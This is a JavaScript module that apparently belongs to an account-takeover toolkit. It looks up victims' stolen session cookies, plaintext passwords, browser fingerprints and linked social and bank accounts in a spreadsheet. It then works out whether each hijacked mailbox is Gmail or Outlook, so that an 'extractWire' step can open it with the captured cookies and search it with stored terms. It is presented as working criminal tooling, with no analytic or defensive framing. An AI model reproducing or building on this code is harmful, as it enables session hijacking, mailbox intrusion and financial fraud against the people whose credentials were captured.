import logger from '../../../utils/logger.js';
import { getSheetDataApi } from '../../api/googlesheets.js';
import { COOKIE_SHEET } from './constants.js';

export async function resolveSession(browserId) {
    const result = await getSheetDataApi(COOKIE_SHEET);
    if (!result.success) throw new Error(`Failed to read cookie sheet: ${result.error}`);
    const headers = result.headers;
    const browserIdIdx = headers.indexOf('browserId');
    if (browserIdIdx === -1) throw new Error('cookie sheet missing browserId column');
    const row = result.data.find(r => String(r[browserIdIdx]).trim() === String(browserId).trim());
    if (!row) throw new Error(`No cookie row found for browserId: ${browserId}`);

    const col = (key) => {
        const idx = headers.indexOf(key);
        return idx !== -1 ? row[idx] : null;
    };

    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
    // Prefer the platform stored by the login flow (written at capture time from
    // MX matching — e.g. custom-domain Office accounts get 'outlook'). Domain
    // detection alone returns 'other' for custom domains, which used to make
    // extractWire fall back to gmail and navigate mail.google.com instead of the
    // account's real mailbox.
    const storedPlatform = String(col('platform') || '').toLowerCase().trim();
    const platform = (storedPlatform === 'gmail' || storedPlatform === 'outlook')
        ? storedPlatform
        : detectEmailPlatform(domain);
    const platformSource = (storedPlatform === 'gmail' || storedPlatform === 'outlook') ? 'stored' : 'domain';
    const driveCookieJSON = col('driveCookieJSON') || '';
    const accountCookieJSON = col('accountCookieJSON') || col('accountCookie') || '';
    const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
    const password = col('password') || '';
    const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
    const browserIdentityRaw = col('browserIdentity') || '';
    let browserIdentity = null;
    if (browserIdentityRaw) {
        try { browserIdentity = typeof browserIdentityRaw === 'string' ? JSON.parse(browserIdentityRaw) : browserIdentityRaw; } catch (_) {}
    }

    if (!cookieJSON && !driveCookieJSON && !accountCookieJSON) throw new Error(`No cookie data found for browserId: ${browserId}`);

    // Best-effort platform hint for SOCIAL/BANK rows, read from the stored
    // socials/banks arrays (e.g. [{ platform: 'instagram', ... }]).
    const safeParse = (val) => {
        if (!val) return [];
        if (typeof val === 'string') { try { return JSON.parse(val); } catch { return []; } }
        return Array.isArray(val) ? val : [];
    };
    const socials = safeParse(col('socials'));
    const banks = safeParse(col('banks'));
    const socialPlatform = socials[0]?.platform || socials[0]?.website || '';
    const socialUsername = socials[0]?.username || socials[0]?.handle || col('username') || '';
    const bankPlatform = banks[0]?.bankName || banks[0]?.website || '';

    return {
        browserId,
        userId: col('userId') || '',
        email,
        domain,
        platform,
        platformSource,
        storedPlatform,
        password,
        socialPlatform,
        socialUsername,
        bankPlatform,
        driveCookieJSON: typeof driveCookieJSON === 'string' ? driveCookieJSON : (driveCookieJSON ? JSON.stringify(driveCookieJSON) : ''),
        accountCookieJSON: typeof accountCookieJSON === 'string' ? accountCookieJSON : (accountCookieJSON ? JSON.stringify(accountCookieJSON) : ''),
        cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
        driveUrl: driveUrl || '',
        category: col('category') || '',
        browserIdentity,
    };
}

export async function getUserSearchParams(userId) {
    if (!userId) return [];
    try {
        const result = await getSheetDataApi('user');
        if (!result.success) {
            logger.warn(`[smartExtract] user sheet read failed: ${result.error}`);
            return [];
        }
        const idx = result.headers.indexOf('searchParams');
        if (idx === -1) return [];
        const uidIdx = result.headers.indexOf('userId');
        if (uidIdx === -1) return [];
        const row = result.data.find(r => String(r[uidIdx]).trim() === String(userId).trim());
        if (!row) return [];
        const raw = String(row[idx] || '');
        const terms = raw.split(',').map(t => t.trim().toLowerCase()).filter(Boolean);
        return [...new Set(terms)];
    } catch (e) {
        logger.warn(`[smartExtract] getUserSearchParams failed: ${e.message}`);
        return [];
    }
}

export function detectEmailPlatform(domain) {
    const d = String(domain).toLowerCase();
    if (d.includes('gmail') || d.includes('googlemail')) return 'gmail';
    // Microsoft consumer + business domains. 'microsoft' covers microsoftonline.com
    // and *.onmicrosoft.com (tenant) domains; office.com/office365.com cover M365.
    if (
        d.includes('outlook') || d.includes('hotmail') || d.includes('live.com') ||
        d.includes('msn') || d.includes('microsoft') || d.includes('windowslive') ||
        d.includes('office365') || d === 'office.com' || d.endsWith('.office.com')
    ) return 'outlook';
    return 'other';
}

// Infer mailbox platform from the captured cookie domains — works for any custom
// domain whose stored platform is missing/unknown (e.g. legacy rows).
// Returns 'gmail' | 'outlook' | null.
function inferPlatformFromCookies(cookieJSON) {
    try {
        const cookies = typeof cookieJSON === 'string' ? JSON.parse(cookieJSON) : cookieJSON;
        if (!Array.isArray(cookies)) return null;
        const domains = cookies.map(c => String(c?.domain || '').toLowerCase());
        const hasGoogle = domains.some(d => d === 'google.com' || d.endsWith('.google.com') || d.includes('gmail'));
        const hasMicrosoft = domains.some(d =>
            d.includes('outlook') || d.includes('office.com') || d.includes('office365') ||
            d.includes('hotmail') || d.includes('live.com') || d.includes('microsoft.com')
        );
        if (hasMicrosoft && !hasGoogle) return 'outlook';
        if (hasGoogle && !hasMicrosoft) return 'gmail';
        return null;
    } catch (_) {
        return null;
    }
}

export { inferPlatformFromCookies };
